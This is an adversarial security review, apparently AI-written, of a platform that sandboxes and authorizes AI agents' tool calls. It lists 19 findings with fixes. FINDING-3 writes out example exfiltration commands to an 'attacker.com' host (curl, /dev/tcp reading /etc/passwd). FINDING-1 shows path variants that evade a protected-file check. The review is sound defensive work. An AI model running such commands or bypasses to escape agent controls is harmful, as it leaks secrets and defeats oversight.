# Adversarial Architecture & Security Review
## Enterprise Agent Security Platform
### October 2026

> **Assessment:** Independent adversarial security review  
> **Reviewer:** Google Antigravity — Claude Opus 4.6  
> **Review date:** 2026-10-03  
> **Mode:** Read-only repository assessment  
> **Repository modifications:** None  
> **Status:** Non-authoritative security assessment
>
> This review is preserved as independent assessment evidence. It does not
> supersede ADRs, the threat model, or implementation contracts. Findings must
> be independently adjudicated against the current architecture before
> implementation.

---

# Executive Summary

The Enterprise Agent Security Platform demonstrates a **mature, architecturally disciplined** Zero Trust security posture for governing AI agents. The codebase shows strong adherence to declared architectural principles: deterministic security decisions, LLM-as-untrusted-parser, monotonic tool identity after resolution, cryptographically signed execution grants, fail-closed defaults across most paths, and thorough documentation of design rationale.

**No finding invalidates a locked architectural decision.** The architecture is fundamentally sound and well-defended.

However, this review identified **19 material findings** across the following risk areas:

| Severity | Count | Highest-Risk Areas |
|----------|-------|--------------------|
| **High** | 5 | Policy bypass via path canonicalization, `REGISTERED` agent status fail-open, sandbox subprocess escape, continuation expiration not atomic, SQL repository fallback |
| **Medium** | 8 | In-memory-only persistence, continuation epoch gap, JWT type confusion, tool registry mutability, capability profile overwrite, agent lock memory exhaustion, session event FK constraints, event ordering by timestamp |
| **Low** | 6 | Missing CORS, unsalted telemetry hash, missing SAST in CI, missing JTI claim, `SessionEvent` lacking `requested_tool_id`, policy resource check scoping |

**Highest-risk areas requiring attention:**
1. Policy engine resource authorization bypass via path canonicalization
2. `REGISTERED` agent status not denied by policy (fail-open)
3. Process-level sandbox bypass via subprocess spawning
4. Approval continuation claim not validating epoch or expiration atomically
5. SQL backend silently falling back to in-memory for audit/agent/tool repositories

---

# Findings

## FINDING-1 — Policy Engine Resource Authorization Bypass via Path Canonicalization

**Severity:** High
**Classification:** Current security defect
**Confidence:** High

**Evidence:**
- **File:** [`app/policy/policy_engine.py`](../../app/policy/policy_engine.py#L118-L121)
- **Component:** `PolicyEngine.evaluate_policy`
- **Code:**
  ```python
  if (
      tool.tool_id == "file_read"
      and resource in self.PROTECTED_RESOURCES
  ):
  ```
  Where `PROTECTED_RESOURCES = {"secrets.txt"}` (line 44).

**Problem:**
The resource check uses exact string matching against a hardcoded set. No path canonicalization is applied. The check is also scoped only to `"file_read"`, not to the resource itself.

**Attack/failure scenario:**
1. An attacker requests `resource="./secrets.txt"` or `resource="/workspace/secrets.txt"` — bypasses the exact-string check.
2. An attacker uses `resource="SECRETS.TXT"` on case-insensitive filesystems — bypasses the check.
3. An attacker uses a different tool (e.g., `directory_list` with a hypothetical write capability) against the same resource — the check only fires for `file_read`.

**Impact:**
Protected resources can be accessed by an authorized agent through trivial path variations, defeating the declared resource authorization control.

**Affected invariant/contract:**
Security Invariant #2 ("Tool execution always passes through the Runtime Security Pipeline") — the pipeline passes but does not evaluate the resource correctly.

**ADR/threat-model relationship:**
The threat model documents "Boundary 3: Runtime Security Pipeline Enforcement" as the deterministic boundary. This resource check is the only resource-level policy gate and it can be trivially bypassed.

**Four-question assessment:**
1. Does not invalidate architectural decision — resource authorization is correct in intent.
2. Introduces a threat that should be added: "Path canonicalization bypass of resource-level policy."
3. Belongs in current implementation — the fix is to canonicalize paths before comparison.
4. Yes — resource-level authorization is core to enterprise customers.

**Recommended action:**
Canonicalize resource paths before comparison. Extend the resource check to operate independently of `tool_id` (evaluate by resource, not by tool-resource pair). Consider moving to a path-prefix-based allowlist/denylist.

---

## FINDING-2 — `REGISTERED` Agent Status Passes Policy as Active

**Severity:** High
**Classification:** Current security defect
**Confidence:** High

**Evidence:**
- **File:** [policy_engine.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/policy/policy_engine.py#L54-L57)
- **File:** [agent.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/agent.py#L26)
- **Component:** `PolicyEngine.evaluate_policy`, `Agent.status` default

**Code:**
```python
# policy_engine.py:54-57
if agent.status in {
    AgentStatus.SUSPENDED,
    AgentStatus.DISABLED,
}:
```

```python
# agent.py:26
status: AgentStatus = AgentStatus.REGISTERED
```

**Problem:**
`AgentStatus` has four values: `REGISTERED`, `ACTIVE`, `SUSPENDED`, `DISABLED`. The policy engine only blocks `SUSPENDED` and `DISABLED`. A newly created agent with default status `REGISTERED` (which has not been explicitly activated) falls through to `ALLOW`.

**Attack/failure scenario:**
An agent registered but never explicitly activated through an onboarding workflow can immediately begin executing tools. If agent activation is intended as a distinct administrative step, this is a fail-open bypass of that gate.

**Impact:**
Agents bypass any intended activation workflow. Depending on the enterprise deployment model, this could allow unauthorized agents to execute tools immediately upon registration.

**Affected invariant/contract:**
Security Invariant #3 ("Authorization precedes execution").

**ADR/threat-model relationship:**
The threat model does not explicitly document agent lifecycle states as a policy gate.

**Four-question assessment:**
1. Does not invalidate an architectural decision — it is a missing policy check.
2. Yes — "Agent lifecycle bypass" should be added to the threat model.
3. Belongs in current implementation.
4. Yes — enterprise customers expect agent activation as a controlled gate.

**Recommended action:**
Either add `REGISTERED` to the deny set in `PolicyEngine`, or explicitly document that `REGISTERED` is treated as equivalent to `ACTIVE` for policy purposes. The former is recommended.

---

## FINDING-3 — Process Sandbox Bypass via Subprocess Spawning

**Severity:** High
**Classification:** Current security defect (within documented scope)
**Confidence:** High

**Evidence:**
- **File:** [runner.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/sandbox/runner.py#L92-L107)
- **File:** [filesystem.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/sandbox/filesystem.py)
- **File:** [network.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/sandbox/network.py)
- **Component:** `FilesystemSandboxGuard`, `NetworkSandboxGuard`

**Problem:**
Both filesystem and network sandbox guards use `sys.addaudithook` to intercept `open`, `socket.connect`, `socket.bind`, and `socket.sendto`. However, they do not intercept `subprocess.Popen`, `os.system`, `os.exec*`, or `os.spawn*` audit events. A tool implementation can spawn a child process that inherits the parent's environment and is not subject to the audit hooks.

**Attack/failure scenario:**
A malicious tool implementation calls `subprocess.run(["curl", "http://attacker.com/?data=..."])` or `os.system("cat /etc/passwd > /dev/tcp/attacker.com/80")`. The audit hooks in the parent process do not fire for the child's syscalls.

**Impact:**
Complete bypass of filesystem and network sandbox controls for any tool that can execute Python's `subprocess` module.

**Affected invariant/contract:**
Security Invariant #13 ("Tool execution never runs in-process within the security gateway") is upheld, but the sandbox's Level 2 containment is weaker than documented.

**ADR/threat-model relationship:**
The threat model *does* document this as an explicit non-goal: "Native extensions, raw syscalls, privileged operations, and kernel-level escape techniques are outside this boundary." However, subprocess spawning via standard Python APIs is not a "native extension" or "raw syscall" — it is standard Python, which is within the declared scope.

> [!IMPORTANT]
> The sandbox documentation states it provides "process-level capability containment for standard Python tool code." Subprocess spawning *is* standard Python tool code. The current implementation does not contain it.

**Four-question assessment:**
1. Does not invalidate the architecture — the sandbox is explicitly described as Level 2.
2. Yes — "subprocess escape from process-level sandbox" should be in the threat model.
3. Belongs in current implementation — hooking `subprocess.Popen` is straightforward.
4. Yes — enterprise customers expect sandbox containment of Python code.

**Recommended action:**
Add audit hook interception for subprocess creation events (`subprocess.Popen`, `os.system`, etc.) or block them outright in the sandbox context.

---

## FINDING-4 — Approval Continuation Claim Does Not Validate Epoch or Expiration Atomically

**Severity:** High
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [approval_continuation_repository.py (SQL)](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/sql/approval_continuation_repository.py#L117-L137)
- **Component:** `SqlApprovalContinuationRepository.transition_continuation`

**Code:**
```python
with transactional_session(self._session_factory) as db:
    row = db.execute(
        select(ApprovalContinuationModel)
        .where(ApprovalContinuationModel.grant_id == grant_id)
        .with_for_update()
    ).scalar_one_or_none()

    if row is None or row.state != from_state.value:
        return False

    row.state = to_state.value
    # ... no epoch check, no expires_at check
```

**Problem:**
The atomic CAS operation (`APPROVED → CONSUMED`) does not validate:
1. `enforcement_epoch` against the current agent epoch
2. `expires_at` against the current time

The continuation is persisted with both fields (lines 58-61 of the model), but the claim operation ignores them.

**Attack/failure scenario:**
1. An agent is suspended (epoch incremented) after an approval was granted. The continuation remains `APPROVED`. A concurrent request claims the continuation successfully because `transition_continuation` does not check epoch.
2. A continuation that has expired (`expires_at < now()`) can be claimed because the persistence layer does not enforce the deadline.

**Impact:**
A suspended agent could claim an approval continuation and (if a service layer exists that mints a `RuntimeExecutionGrant` from it) potentially execute. An expired approval could be claimed after its intended validity window.

**Affected invariant/contract:**
The `claim_continuation(continuation_id, expected_epoch, now)` contract specified in the architectural requirements is not fully implemented at the repository level.

**ADR/threat-model relationship:**
ADR-031 specifies that continuation claim must be atomic and epoch-gated. The current implementation enforces atomicity for state transition but not for epoch or expiration.

**Four-question assessment:**
1. Does not invalidate the architectural decision — the architecture specifies epoch validation.
2. Yes — "stale continuation claim after suspension" should be in the threat model.
3. Belongs in current implementation — the epoch and expiration fields exist but are not checked.
4. Yes — this is core to the approval continuation workstream.

**Recommended action:**
Add `enforcement_epoch` and `expires_at` validation to the `WHERE` clause of the atomic CAS update, so the row lock only succeeds when all conditions hold.

---

## FINDING-5 — SQL Repository Factory Silently Falls Back to In-Memory for Audit, Agent, and Tool

**Severity:** High
**Classification:** Current architecture defect
**Confidence:** High

**Evidence:**
- **File:** [factory.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/factory.py#L97-L104)
- **Component:** `create_repositories` (backend="sql")

**Code:**
```python
return RepositoryContainer(
    agent_repository=agent_repository or InMemoryAgentRepository(),      # fallback
    tool_repository=tool_repository or InMemoryToolRepository(),          # fallback
    session_repository=SqlSessionRepository(sf),
    enforcement_repository=SqlEnforcementStateRepository(sf),
    approval_grant_repository=SqlApprovalContinuationRepository(sf),
    audit_repository=audit_repository or InMemoryAuditEvidenceRepository(),  # fallback
)
```

**Problem:**
When `backend="sql"` is selected, the factory silently falls back to in-memory repositories for `agent_repository`, `tool_repository`, and `audit_repository` if they are not explicitly provided. This means:
- Audit evidence is silently lost on process restart
- Agent state is silently lost on process restart
- Tool registrations are silently lost on process restart

The caller may reasonably believe that selecting `backend="sql"` means all repositories are durable.

**Impact:**
Audit evidence — the compliance cornerstone of the platform — may be silently ephemeral in a production SQL deployment. This directly contradicts Security Invariant #4 ("Every final decision is audited") and #16 ("Recording audit evidence never depends on control-plane state").

**Affected invariant/contract:**
Security Invariant #4, #16, #17.

**ADR/threat-model relationship:**
Contradicts ADR-030 ("Durable State Repository Architecture").

**Four-question assessment:**
1. Does not invalidate the architecture — the architecture intends SQL for all repositories.
2. No new threat — it is an implementation gap.
3. Belongs in current implementation.
4. Yes — enterprise customers require durable audit evidence.

**Recommended action:**
Either require all repositories for `backend="sql"` (fail if any are missing), or implement SQL repositories for agent, tool, and audit and use them by default.

---

## FINDING-6 — In-Memory-Only Persistence for Production Runtime

**Severity:** Medium
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [dependencies.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/api/dependencies.py#L52-L61)
- **Component:** Composition root

**Code:**
```python
agent_repository: InMemoryAgentRepository = InMemoryAgentRepository()
enforcement_repository: InMemoryEnforcementStateRepository = InMemoryEnforcementStateRepository()
audit_repository: InMemoryAuditEvidenceRepository = InMemoryAuditEvidenceRepository()
session_repository: InMemorySessionRepository = InMemorySessionRepository()
tool_repository: InMemoryToolRepository = InMemoryToolRepository()
```

**Problem:**
The production composition root uses exclusively in-memory repositories. All platform state — agents, enforcement state, audit evidence, sessions, tool registrations, findings, risk posture — is lost on process restart.

**Impact:**
A process restart results in total loss of:
- All audit evidence (compliance failure)
- All enforcement state (suspended agents become unknown)
- All risk posture (accumulated findings lost)
- All session ownership bindings

**Affected invariant/contract:**
Security Invariants #4 (auditing), #8 (findings as authoritative evidence), #9 (runtime enforcement is one-way — but restart resets it).

**Four-question assessment:**
1. Does not invalidate the architecture — the SQL path exists.
2. No new threat category.
3. Belongs in current implementation backlog — SQL repositories exist for some types.
4. Yes — enterprise customers require durable state.

**Recommended action:**
This is a known deployment gap. The SQL repository implementations exist for session, enforcement, and approval continuation. Agent, tool, and audit SQL implementations should be completed. The production composition root should be configurable for SQL persistence.

---

## FINDING-7 — JWT Token Type Confusion (Potential 500 Error)

**Severity:** Medium
**Classification:** Current security defect
**Confidence:** Medium

**Evidence:**
- **File:** [jwt_service.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/auth/jwt_service.py#L64-L67)
- **Component:** `JWTService.verify_token`

**Code:**
```python
try:
    return JWTClaims(**payload)
except ValidationError as e:
    raise ValueError(f"Invalid token claims: {e}") from e
```

**Problem:**
If an attacker crafts a valid JWT whose payload is a JSON string (not a JSON object), `jwt.decode` returns a string. The `**payload` unpacking will throw a `TypeError` (not a `ValidationError`), which is not caught and propagates as an unhandled 500.

**Attack/failure scenario:**
An attacker signs a JWT with `"malicious_string"` as the payload. The server returns HTTP 500 with a stack trace instead of 401. Repeated requests can pollute logs and potentially cause denial-of-service.

**Impact:**
Information disclosure via stack traces (if enabled) and degraded availability.

**Affected invariant/contract:**
Authentication fails closed — but it fails as 500, not 401.

**Four-question assessment:**
1. Does not invalidate any architectural decision.
2. No — this is a standard input validation gap.
3. Belongs in current implementation.
4. No — minor hardening.

**Recommended action:**
Catch `TypeError` alongside `ValidationError` in the `verify_token` method, or validate that `payload` is a `dict` before unpacking.

---

## FINDING-8 — Tool Registry Allows Unregister and Re-Register (Mutable Identity)

**Severity:** Medium
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [tool_registry.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/registry/tool_registry.py)
- **Component:** `ToolRegistry.unregister`, `ToolRegistry.register`

**Problem:**
`ToolRegistry` permits unregistering a `(tool_id, version)` and registering a new implementation under the same identity. The underlying executable factory can be swapped.

**Impact:**
An outstanding execution grant references a `(tool_id, tool_version)` that was resolved at issuance. If the registry entry is unregistered and re-registered with a different implementation between issuance and execution, the executor will resolve the same `(tool_id, tool_version)` to a different executable.

> [!NOTE]
> This is partially mitigated by the grant's 30-second TTL and the `verify_capability_binding` check in the executor. However, if the replacement tool has the same capability profile, the substitution succeeds silently.

**Affected invariant/contract:**
"Execution identity is monotonic — Once a concrete (tool_id, tool_version) has been resolved and authorized, downstream components must consume that identity."

**Four-question assessment:**
1. Does not invalidate the architecture — the architecture states this must hold.
2. Yes — "tool implementation substitution via registry mutation" should be in the threat model.
3. Belongs in current implementation or near-term hardening.
4. Yes — enterprise customers expect executable identity stability.

**Recommended action:**
Make `(tool_id, version)` registration append-only — disallow unregister, or disallow re-register of a previously used identity. Alternatively, bind the executable implementation hash into the grant signature.

---

## FINDING-9 — Capability Profile Registry Allows Overwrite

**Severity:** Medium
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [capability_registry.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/runtime/capability_registry.py#L76-L78)
- **Component:** `InMemoryCapabilityProfileRegistry.register_profile`

**Code:**
```python
def register_profile(self, capabilities: ExecutionCapabilities) -> None:
    with self._lock:
        self._profiles[capabilities.capability_profile_id] = capabilities
```

**Problem:**
The registry blindly overwrites an existing profile without checking. A profile's digest is signed into the grant, so changing a profile's content after a grant is issued creates a divergence between what was authorized and what exists in the registry.

**Impact:**
The executor's `verify_capability_binding` check would catch this divergence (digest mismatch → fail closed). So this is a *denial-of-service* vector rather than a *privilege escalation*: overwriting a profile prevents valid grants from executing.

**Affected invariant/contract:**
"Capability definitions are append-only."

**Four-question assessment:**
1. Does not invalidate the architecture.
2. Minor — "capability profile overwrite causing execution denial."
3. Belongs in current implementation.
4. No — low-impact denial-of-service within the process boundary.

**Recommended action:**
Add a check: refuse to overwrite an existing profile. Alternatively, make profiles append-only with versioned IDs.

---

## FINDING-10 — Agent Lock Manager Unbounded Memory Growth

**Severity:** Medium
**Classification:** Design gap
**Confidence:** Medium

**Evidence:**
- **File:** [agent_lock_manager.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/services/agent_lock_manager.py#L20-L25)
- **Component:** `AgentLockManager.get_lock`

**Code:**
```python
with self._registry_lock:
    lock = self._locks.get(agent_id)
    if lock is None:
        lock = RLock()
        self._locks[agent_id] = lock
    return lock
```

**Problem:**
Locks are lazily allocated per unique `agent_id` and never evicted. An attacker who can influence `agent_id` values (e.g., through the management API or if authorization fails late) can cause unbounded memory growth.

**Impact:**
Denial-of-service through memory exhaustion if an attacker can trigger lock creation for arbitrary agent IDs.

> [!NOTE]
> In the current architecture, agent IDs are validated against registered agents before reaching the posture lock. The risk depends on how many unique agent IDs can reach the lock manager before authorization denies them.

**Affected invariant/contract:**
No specific invariant — this is an operational robustness gap.

**Four-question assessment:**
1. Does not invalidate any architectural decision.
2. No — standard denial-of-service hardening.
3. Belongs in future backlog.
4. No — bounded by the authorization check that precedes it.

**Recommended action:**
Add a maximum capacity or LRU eviction to the lock manager. Alternatively, verify that all callers validate agent_id existence before calling `get_lock`.

---

## FINDING-11 — Session Event Foreign Key Constraint Creates Authorization Denial Path

**Severity:** Medium
**Classification:** Architecture contradiction
**Confidence:** High

**Evidence:**
- **File:** `app/repositories/sql/models/session_event.py` (lines 46-50, 68-72)
- **Component:** `SessionEventModel` SQL schema

**Code:**
```python
ForeignKeyConstraint(
    ["tool_id", "tool_version"],
    ["tools.tool_id", "tools.version"],
    ondelete="RESTRICT",
),
# ...
tool_id: Mapped[str] = mapped_column(
    String(128),
    ForeignKey("tool_families.tool_id", ondelete="RESTRICT"),
    nullable=False,
)
```

**Problem:**
`SessionEventModel` enforces foreign key constraints to `tool_families` and `tools` tables. If a request names a tool that does not exist in the registry, the session event INSERT fails with a referential integrity violation, preventing the pipeline from recording the denial.

**Impact:**
This contradicts Security Invariant #16: "Recording audit evidence never depends on control-plane state." While `AuditEvent` deliberately avoids FK constraints for this reason, `SessionEvent` does not.

**Affected invariant/contract:**
Security Invariant #16, ADR-034.

**ADR/threat-model relationship:**
ADR-034 explicitly states audit evidence should be recordable regardless of registry state. `SessionEvent` is behavioral evidence used by the detection horizon.

**Four-question assessment:**
1. Does not invalidate the architecture — `AuditEvent` is correct; `SessionEvent` diverges.
2. Yes — "session event recording failure for unknown tools" should be tracked.
3. Belongs in current implementation.
4. Yes — unrecordable session events create detection blind spots.

**Recommended action:**
Remove or relax the foreign key constraints on `SessionEventModel`. Follow the `AuditEventModel` pattern, which deliberately avoids FKs.

---

## FINDING-12 — Session Event Ordering by Timestamp Instead of Sequence Number

**Severity:** Medium
**Classification:** Current defect
**Confidence:** High

**Evidence:**
- **File:** `app/repositories/sql/session_repository.py` (lines 227-230)
- **Component:** `SqlSessionRepository.list_events`

**Code:**
```python
.order_by(
    SessionEventModel.timestamp.asc(),
    SessionEventModel.sequence_number.asc(),
)
```

**Problem:**
Events are sorted by `timestamp` first, with `sequence_number` as a tie-breaker. The security invariant is that `sequence_number` is the authoritative monotonic ordering. Events with out-of-order timestamps will be presented in non-monotonic sequence order.

**Impact:**
The detection horizon, which evaluates events in order, may evaluate events in the wrong sequence when timestamps are not perfectly monotonic (e.g., clock drift, NTP adjustments).

**Affected invariant/contract:**
"SessionEvent.sequence_number" monotonic namespace integrity.

**Four-question assessment:**
1. Does not invalidate the architecture.
2. No — it is an implementation bug.
3. Belongs in current implementation.
4. Minor — affects detection accuracy under clock drift.

**Recommended action:**
Reverse the `ORDER BY` to sort by `sequence_number` first, `timestamp` second.

> **Subsequent project context:** This finding is preserved as reported by
> Opus 4.6. A later architecture review identified that timestamp-first,
> sequence-number-second ordering is intentional and covered by the existing
> event-ordering invariant/test. Final disposition is deferred to the formal
> adversarial-review adjudication.

---

## FINDING-13 — `SessionEvent` Lacks `requested_tool_id` (Requested vs. Resolved Identity)

**Severity:** Medium
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [session_event.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/session_event.py#L61-L62)
- **Component:** `SessionEvent` model

**Problem:**
`AuditEvent` carefully distinguishes `requested_tool_id` (what was asked) from `tool_id` (what was resolved). `SessionEvent` conflates both into a single `tool_id` field. The detection horizon therefore cannot distinguish whether a tool was genuinely resolved or merely requested.

**Impact:**
Detection rules operating on session events cannot determine whether the tool identity represents a resolved implementation or an unresolved request. This could affect detection accuracy for tools that fail resolution.

**Affected invariant/contract:**
"requested identity" vs. "resolved identity" distinction in audit evidence.

**Four-question assessment:**
1. Does not invalidate the architecture.
2. No.
3. Belongs in current implementation or near-term backlog.
4. Minor — improves detection fidelity.

**Recommended action:**
Add `requested_tool_id` to `SessionEvent` to mirror `AuditEvent`.

---

## FINDING-14 — Continuation Claim-to-Grant Gap (Temporal Separation)

**Severity:** Medium
**Classification:** Design gap (acknowledged)
**Confidence:** High

**Evidence:**
- **File:** [approval_continuation_repository.py (interface)](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/repositories/interfaces/approval_continuation_repository.py#L33-L51)
- **Component:** `ApprovalContinuationRepository.transition_continuation`

**Problem:**
`transition_continuation` returns `bool`, not a `RuntimeExecutionGrant`. The service layer must:
1. Call `transition_continuation` (APPROVED → CONSUMED) — commits its own transaction.
2. Mint a `RuntimeExecutionGrant` from the continuation's frozen authority.

If the service crashes between steps 1 and 2, the continuation is permanently CONSUMED with no grant ever issued. The agent must re-prompt the human operator for a new approval.

**Impact:**
Operational — not a security vulnerability (the consumed state is terminal and cannot be re-consumed). But it creates a poor user experience and potential compliance gap if approvals are audited as consumed but never executed.

**Affected invariant/contract:**
"Continuation claim must be atomic" — the state transition is atomic, but the claim-to-grant lifecycle is not.

**Four-question assessment:**
1. Does not invalidate the architecture.
2. No new security threat.
3. Belongs in future backlog — the architecture acknowledges this gap.
4. Minor — operational resilience.

**Recommended action:**
Consider returning the frozen authority from `transition_continuation` so grant minting can occur within the same transaction boundary. Alternatively, add a recovery mechanism for CONSUMED-but-never-minted continuations.

---

## FINDING-15 — Missing CORS Configuration

**Severity:** Low
**Classification:** Design gap
**Confidence:** High

**Evidence:**
- **File:** [main.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/main.py)
- **Component:** FastAPI application assembly

**Problem:**
No `CORSMiddleware` is configured. If a browser-based frontend or administrative console interacts with this API, cross-origin requests are unrestricted.

**Impact:**
Potential CSRF if a browser interacts with the API. Mitigated if the API is only accessed by server-side agents (no browser).

**Four-question assessment:**
1. Does not invalidate the architecture.
2. No — standard HTTP hardening.
3. Depends on deployment model.
4. Yes, if a frontend exists.

**Recommended action:**
Add `CORSMiddleware` with restrictive origins. The frontend directory exists in the repository, suggesting browser interaction is planned.

---

## FINDING-16 — Telemetry Parameter Hash is Unsalted

**Severity:** Low
**Classification:** Design gap
**Confidence:** Medium

**Evidence:**
- **File:** `app/models/telemetry/behavioral_event.py` (lines 14-22)
- **Component:** `compute_parameter_hash`

**Problem:**
Parameter hashing uses unsalted SHA-256. An attacker with access to telemetry logs can reverse short or enumerable parameter values via dictionary attacks.

**Impact:**
Information leakage of tool parameters from telemetry data, if telemetry is exposed to lower-trust consumers.

**Recommended action:**
Add a per-deployment salt to the parameter hash computation.

---

## FINDING-17 — Missing JTI Claim in JWT Tokens

**Severity:** Low
**Classification:** Design gap
**Confidence:** Medium

**Evidence:**
- **File:** [jwt_claims.py](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/app/models/jwt_claims.py)
- **Component:** `JWTClaims` model

**Problem:**
JWT tokens lack a `jti` (JWT ID) claim. Without it, token replay cannot be detected server-side (beyond expiration).

**Impact:**
An intercepted token can be replayed for its entire validity period (default: 60 minutes). Mitigated by TLS and the 60-minute expiration window.

**Recommended action:**
Add a `jti` claim. Whether to enforce single-use via server-side tracking is a deployment decision.

---

## FINDING-18 — Missing SAST in CI Pipeline

**Severity:** Low
**Classification:** Test coverage gap
**Confidence:** High

**Evidence:**
- **File:** [ci.yml](file:///Users/shubhankarmathur/projects/enterprise-agent-security-platform/.github/workflows/ci.yml)
- **Component:** CI configuration

**Problem:**
CI runs `pip-audit`, `npm audit`, and `gitleaks` but no static application security testing (e.g., `bandit`, `semgrep`). Code-level injection flaws, subprocess misuse, and insecure patterns are not detected.

**Recommended action:**
Add `bandit` or `semgrep` to the CI pipeline.

---

## FINDING-19 — OllamaAgent System Prompt Teaches Secret File Access

**Severity:** Low
**Classification:** Documentation defect
**Confidence:** Medium

**Evidence:**
- **File:** `app/agents/ollama_agent.py` (lines 61-71)
- **Component:** LLM system prompt

**Problem:**
The example in the system prompt explicitly teaches the LLM how to read `secrets.txt`:
```text
Input: please read secrets.txt
Output: {"tool_id": "file_read", "parameters": {"path": "secrets.txt"}}
```

**Impact:**
Minor — the LLM is treated as untrusted and the policy engine blocks `secrets.txt` access for `file_read`. But the prompt unnecessarily demonstrates the attack pattern.

**Recommended action:**
Replace the example with a benign file path.

---

# Cross-Cutting Observations

1. **Fail-closed discipline is strong and consistent.** Nearly every component defaults to denial on error, missing data, or unavailable services. This is a distinguishing architectural strength.

2. **Documentation-implementation alignment is excellent.** Code comments extensively reference ADRs, milestone numbers, and finding IDs. The rationale for design decisions is preserved in code, not just in separate documents.

3. **The security regression test suite is comprehensive.** Dedicated regression tests for audit immutability, session event ordering, execution evidence wiring, finding immutability, sandbox isolation, and more demonstrate a mature testing culture.

4. **In-memory persistence is the universal default.** While SQL implementations exist for some repositories, the production composition root uses exclusively in-memory repositories. This is the single largest gap between documented architecture and production readiness.

5. **The approval continuation workstream is partially implemented.** The domain model and repository layer are well-designed, but the service layer that orchestrates `continuation claim → grant mint → execution` does not yet exist in the codebase. The repository-level findings (epoch, expiration) are gaps in an incomplete system.

---

# Contradictions

| # | Code | Documentation | Nature |
|---|------|---------------|--------|
| 1 | `SessionEventModel` has FK constraints to tool registry | ADR-034 / SI #16: evidence recording must not depend on registry state | Architecture contradiction |
| 2 | `PolicyEngine` only blocks `SUSPENDED` and `DISABLED` | `AgentStatus` enum includes `REGISTERED` as a distinct pre-active state | Missing policy coverage |
| 3 | `create_repositories(backend="sql")` falls back to in-memory for 3 repos | ADR-030: "Durable State Repository Architecture" | Implementation gap |
| 4 | SQL `list_events` sorts by `timestamp` then `sequence_number` | Architecture requires `sequence_number` as authoritative order | Implementation bug |
| 5 | Sandbox documentation: "process-level capability containment for standard Python tool code" | No interception of `subprocess.Popen` (standard Python) | Scope gap |

---

# Missing Security Invariants

The following invariants appear necessary but are not currently documented or sufficiently tested:

1. **Path canonicalization before resource-level policy evaluation.** No invariant requires this.
2. **Agent lifecycle gate.** No invariant states that only `ACTIVE` agents may execute.
3. **Tool registry immutability for consumed identities.** No invariant prevents re-registration of a `(tool_id, version)` that has been used in grants or evidence.
4. **Capability profile append-only semantics.** No invariant prevents overwriting an existing profile.
5. **Epoch validation during continuation claim.** Documented in architecture requirements but not enforced or tested in repository layer.
6. **Subprocess containment in process-level sandbox.** Not covered by any existing invariant.
7. **Lock manager memory bounds.** No invariant constrains the growth of per-agent locks.

---

# False Positives / Rejected Concerns

1. **"Grant TTL is too long at 30 seconds."** — Investigated and rejected. The 30-second TTL is a deliberately documented compensating control (ADR-023). It is the upper bound, enforced by `MAX_GRANT_TTL_SECONDS`, and cannot be raised. Agent suspension immediately revokes all outstanding grants, so the TTL only applies to non-suspension governance changes.

2. **"Execution grants could cross process boundaries."** — Investigated and rejected. The signing key is `secrets.token_bytes(32)` generated per process instance. Grants are never serialized to HTTP responses (the API is decision-only). A grant cannot be replayed across process restarts because the key changes.

3. **"Risk aggregator ingest failure could cause data loss."** — Investigated and rejected. Line 1042-1043 of `runtime_service.py` shows that an ingest failure marks the posture as STALE but does not roll back the authoritative finding. The finding is durably recorded; only the projection is degraded.

4. **"Concurrent reinstatement could create inconsistent state."** — Investigated and rejected. The `EnforcementCoordinator.reinstate` method holds the per-agent lock for its entire operation (line 86). A concurrent reinstatement will serialize.

5. **"The JWT leeway of 10 seconds is too generous."** — Investigated and rejected. A 10-second leeway for clock skew is standard practice and does not materially weaken security with 60-minute token lifetimes.

6. **"Tool governance (enable/disable) is not enforced at resolution."** — Investigated and found to be *by design*. The runtime service explicitly checks `_version_is_enabled` (line 816-818) *after* registry resolution and *before* grant issuance. `ToolRegistry.resolve()` not checking enablement is intentional: the registry answers "does an executable exist," and governance answers "may it run." These are deliberately separate authorities (lines 797-803).

---

# Recommended Review Order

> [!CAUTION]
> Do NOT implement fixes from this review without first confirming each finding against the current codebase and architectural intent.

1. **FINDING-2** (REGISTERED status fail-open) — Quick policy fix, high impact, no architectural change needed.
2. **FINDING-1** (Path canonicalization bypass) — Quick policy fix, high impact.
3. **FINDING-4** (Continuation epoch/expiration gap) — Important for the approval continuation workstream.
4. **FINDING-3** (Subprocess sandbox escape) — Add audit hook for subprocess creation.
5. **FINDING-7** (JWT type confusion) — Simple defensive fix.
6. **FINDING-12** (Session event ordering) — Simple `ORDER BY` fix.
7. **FINDING-11** (SessionEvent FK constraints) — Architecture alignment with ADR-034.
8. **FINDING-5** (Repository factory fallback) — Fail-closed instead of silent fallback.
9. **FINDING-8** (Tool registry mutability) — Design decision on append-only semantics.
10. **FINDING-6** (In-memory persistence) — Complete SQL implementations for remaining repositories.
11. **FINDING-9** (Capability profile overwrite) — Minor hardening.
12. **FINDING-15** (CORS) — Depends on frontend deployment model.
13. **FINDING-13** (SessionEvent requested_tool_id) — Model enhancement.
14. **FINDING-14** (Continuation claim-to-grant gap) — Architectural decision for the approval workstream.
15. **FINDING-10** (Lock manager memory) — Operational hardening.
16. **FINDING-18** (SAST in CI) — Pipeline enhancement.
17. **FINDING-17** (JTI claim) — Token hardening.
